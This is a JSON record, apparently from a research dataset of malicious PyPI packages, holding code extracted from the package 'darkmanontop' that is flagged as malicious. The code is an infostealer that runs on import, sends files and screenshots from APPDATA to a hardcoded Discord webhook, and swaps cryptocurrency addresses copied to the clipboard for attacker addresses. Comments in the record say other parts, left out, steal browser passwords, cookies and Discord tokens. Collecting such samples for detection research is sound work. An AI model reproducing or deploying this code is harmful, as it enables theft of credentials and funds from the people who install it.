[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/darkmanontop-0.0.1/darkmanontop-0.0.1/methantiafkxd/__init__.py",
    "malicious_code": "import os\nimport re\nimport time\nimport json\nimport httpx\nimport shutil\nimport winreg\nimport ntpath\nimport random\nimport psutil\nimport base64\nimport ctypes\nimport zipfile\nimport asyncio\nimport sqlite3\nimport requests\nimport win32con\nimport win32gui\nimport threading\nimport pyperclip\nimport subprocess, sys\nfrom sys import argv\nfrom shutil import copy2\nfrom PIL import ImageGrab\nfrom os import name, system\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom json import loads, dumps\nfrom Crypto.Cipher import AES\nfrom tempfile import gettempdir, mkdtemp\nfrom win32crypt import CryptUnprotectData\nfrom urllib.request import Request, urlopen\nfrom datetime import datetime, timedelta, timezone\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1073437415118749778/Kh7_-jfX4mFfMpDTVSCHrWPVOYNYwDxsjrY0kZgt-lE8viwnpNPbgcGMRA3FZlAYiSCl\"\n\ndef send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\ndef zip_and_send_screenshots(screenshots_path, webhook_url):\n    if os.path.exists(screenshots_path):\n        with zipfile.ZipFile('screenshots.zip', 'w') as zip_file:\n            for filename in os.listdir(screenshots_path):\n                file_path = os.path.join(screenshots_path, filename)\n                if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n                    zip_file.write(file_path)\n        send_webhook('screenshots.zip', webhook_url)\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nzip_and_send_screenshots(screenshots_path, webhook_url)\n\n# ...\n# (The rest of the code is also malicious, but for brevity, the following are the main malicious behaviors:)\n\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            # ... (other address types)\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# ...\n# (The bl4ckc4p class and its methods are all malicious, including browser data theft, Discord token theft, injection, exfiltration, etc.)\n\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bl4ckc4p().init())\n\n# ...\n# (The rest of the code, including GatherAll, getPassw, getCookie, upload, blackcapedez, etc., is all malicious and exfiltrates sensitive data)\n\nGatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = blackcapedez()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"\\n\"\n    for arg in blackcapedezFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"```diff\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n```\"\n                filetext += \"\\n\"\n    upload(\"blackcapedez\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
  }
]